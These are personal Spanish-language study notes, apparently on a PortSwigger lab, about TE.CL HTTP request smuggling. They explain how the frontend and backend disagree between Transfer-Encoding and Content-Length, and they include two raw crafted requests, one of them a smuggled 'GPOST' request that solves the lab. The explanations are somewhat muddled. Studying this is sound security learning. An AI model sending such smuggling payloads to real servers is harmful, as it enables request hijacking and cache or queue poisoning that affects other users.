**TE.CL** (Transfer-Encoding to Content-Length)
En el burp enviamos un 0 que indica que la petición termino. El Content-Lenght lo lee el backend 
![[Pasted image 20240724144146.png]]
El frontend interpreta que el  El servidor backend interpreta que la petición termino, por el cero ![[Pasted image 20240724144959.png]]
~~~
POST / HTTP/1.1\r\n
Host: Portsqiger-lab\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
X
~~~
El frontend utiliza el transfer encoding (TE) y finaliza la solicitud, pero el backend interpreta el content lenght CL y cuenta 5 carriages por lo que espera un sexto y da un error "500 the conection has time out"

![[Pasted image 20240730193124.png]]
Acá el frontend cuenta los 3 carriages y finaliza todo en el uno. Ahora el backend interpreta una G y a continuación finaliza todo con el "0" por lo que da un error de "GPOST" 
![[Pasted image 20240730193527.png]]
Para completar el laboratorio enviamos una solicitud seguida, el frontend interpeta el cuerpo como los primeros cuatro dígitos (los dos carriage y los dos números, 56) pero el backend ve que estos números, 56 caracteres como la otra petición, la cual es válida porque el Transfer Encoding si es 5 caracteres
![[Pasted image 20240730195612.png]]
~~~
POST / HTTP/1.1\r\n
Host: Portsqiger-lab\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
56\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 5\r\n
\r\n
0\r\n
\r\n
~~~